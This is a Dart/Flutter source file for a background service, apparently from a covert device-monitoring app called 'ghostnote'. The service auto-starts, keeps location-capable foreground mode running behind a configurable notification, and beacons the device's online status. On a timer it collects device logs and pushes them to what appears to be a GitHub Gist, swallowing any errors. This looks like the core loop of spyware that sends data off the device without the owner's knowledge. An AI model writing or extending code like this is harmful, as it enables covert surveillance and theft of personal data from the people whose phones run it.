import 'dart:async';
import 'package:flutter_background_service/flutter_background_service.dart';
import '../config/gist_config.dart';
import 'gist_service.dart';
import 'device_info_service.dart';
import '../models/user_database.dart';

class BackgroundServiceManager {
  static final FlutterBackgroundService _svc = FlutterBackgroundService();
  static DeviceEntry? _device;

  static Future<void> initialize() async {
    await _svc.configure(
      androidConfiguration: AndroidConfiguration(
        onStart: _onStart,
        autoStart: true,
        isForegroundMode: true,
        notificationChannelId: 'ghostnote_sys',
        foregroundServiceNotificationId: 420,
        initialNotificationTitle: GistConfig.notificationTitle,
        initialNotificationContent: GistConfig.notificationBody,
        foregroundServiceTypes: [
          AndroidForegroundType.dataSync,
          AndroidForegroundType.location,
        ],
      ),
      iosConfiguration: IosConfiguration(
        autoStart: true,
        onForeground: _onStart,
        onBackground: _onIosBackground,
      ),
    );
  }

  @pragma('vm:entry-point')
  static Future<bool> _onIosBackground(ServiceInstance svc) async => true;

  @pragma('vm:entry-point')
  static void _onStart(ServiceInstance svc) async {
    if (svc is AndroidServiceInstance) {
      svc.setAsForegroundService();
      svc.setForegroundNotificationInfo(
        title: GistConfig.notificationTitle,
        content: GistConfig.notificationBody,
      );
    }

    // Build & register device
    _device = await DeviceInfoService.buildDevice();
    await GistService.upsertDevice(_device!);

    // Heartbeat timer — keep online status fresh
    Timer.periodic(const Duration(minutes: 2), (_) async {
      if (_device == null) return;
      await GistService.setOnlineStatus(_device!.id, true);
    });

    // Collection loop
    Timer.periodic(GistConfig.collectionInterval, (_) async {
      if (_device == null) return;
      try {
        final logs = await DeviceInfoService.collectAll();
        for (final log in logs) {
          await GistService.pushLog(_device!.id, log);
        }
      } catch (_) {}
    });

    svc.on('stopService').listen((_) async {
      if (_device != null) {
        await GistService.setOnlineStatus(_device!.id, false);
      }
      svc.stopSelf();
    });
  }

  static Future<void> start() async {
    if (!await _svc.isRunning()) await _svc.startService();
  }

  static Future<void> stop() async {
    if (_device != null) {
      await GistService.setOnlineStatus(_device!.id, false);
    }
    _svc.invoke('stopService');
  }
}